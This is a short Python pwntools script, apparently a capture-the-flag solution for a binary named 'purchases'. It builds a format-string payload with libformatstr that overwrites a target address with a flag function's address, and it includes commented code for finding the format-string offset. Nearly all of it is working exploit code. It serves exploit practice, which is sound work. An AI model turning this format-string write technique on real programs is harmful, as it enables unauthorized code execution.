import sys
from libformatstr import FormatStr
from pwn import *

addr = 0x404040#0x401080#0x08049580
flag_addr = 0x4011b6#0x080489a3

for i in range(200):
	#e = ELF("./purchases")
	pro = process("./purchases")
	#pro = remote("shell.actf.co", 19011)
	pro.recv()

	p = FormatStr(isx64=1)
	p[addr] = flag_addr#system_addr

	# buf is 14th argument, 4 bytes are already printed
	#sys.stdout.write( p.payload(8, start_len=0) )
	#print p.payload(8, start_len=0)
	pro.sendline(p.payload(8, start_len=i))
	print i
	pro.interactive()
	pro.close()
'''from libformatstr import *      # need this for libformatstr
from pwn import *
import sys

bufsiz = 100                    # size of cyclic pattern to send
buf = "" 
#r = remote("localhost", 5000)
r = process("./purchases")
r.recv()

# PART 1 - getting format string offset
r.send(make_pattern(bufsiz) + "\n")             # send cyclic pattern to server
data.recvuntil("You don't have any money to buy ")
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
log.info("offset : " + str(offset))
log.info("padding: " + str(padding))
r.close()'''
